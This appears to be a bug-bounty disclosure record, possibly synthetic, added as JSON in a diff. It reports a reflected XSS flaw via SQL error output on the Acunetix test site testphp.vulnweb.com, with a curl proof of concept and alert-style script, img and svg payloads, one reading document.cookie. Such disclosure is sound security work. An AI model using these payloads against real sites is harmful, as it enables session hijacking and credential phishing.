@@ -1,0 +1,14 @@
+{
+  "id": 800011,
+  "title": "Reflected XSS via cat Parameter in listproducts.php on testphp.vulnweb.com",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "visibility": "full",
+  "team": {"handle": "acunetix-testphp", "name": "Acunetix Test PHP"},
+  "reporter": {"username": "resurface_demo"},
+  "weakness": {"id": 60, "name": "Cross-site Scripting (XSS) - Reflected"},
+  "vulnerability_information": "## Summary\nThe `cat` parameter on `http://testphp.vulnweb.com/listproducts.php` is passed directly into a SQL query. When a non-numeric value containing HTML/JavaScript is provided, the MySQL error message reflects the injected content back into the HTML response without encoding. This creates a Reflected XSS vulnerability through SQL error message reflection.\n\n## Steps to Reproduce\n1. Navigate to:\n```\nhttp://testphp.vulnweb.com/listproducts.php?cat=<script>alert(document.domain)</script>\n```\n2. The server attempts to use the value in a SQL query, which fails, and the error message includes the raw payload:\n```\nError: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '=<script>alert(document.domain)</script>' at line 1\n```\n3. The `<script>` tag within the error message is rendered as HTML, causing JavaScript execution.\n\n## Proof of Concept\n```bash\ncurl -s 'http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert(document.domain)%3C/script%3E'\n```\n\nThe response body contains:\n```html\nError: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '=<script>alert(document.domain)</script>' at line 1\n```\n\nThe unencoded `<script>` tag executes in the browser.\n\nAlternative payloads:\n```\nhttp://testphp.vulnweb.com/listproducts.php?cat=<img src=x onerror=alert('XSS')>\nhttp://testphp.vulnweb.com/listproducts.php?cat=<svg onload=alert(document.cookie)>\n```\n\n## Impact\n- **Reflected XSS** — attacker can execute arbitrary JavaScript in the victim's browser by sending a crafted link\n- **Session hijacking** — steal session cookies via `document.cookie` exfiltration\n- **Credential theft** — inject a fake login form overlay to phish credentials\n- **Chained with SQLi** — the same parameter is also vulnerable to SQL Injection (numeric input is expected for category ID), making this a dual-vulnerability endpoint\n- **Phishing** — the error page looks like a legitimate application page, making social engineering attacks more convincing",
+  "disclosed_at": "2025-08-10T09:30:00.000Z",
+  "bounty_amount": "750.0"
+}
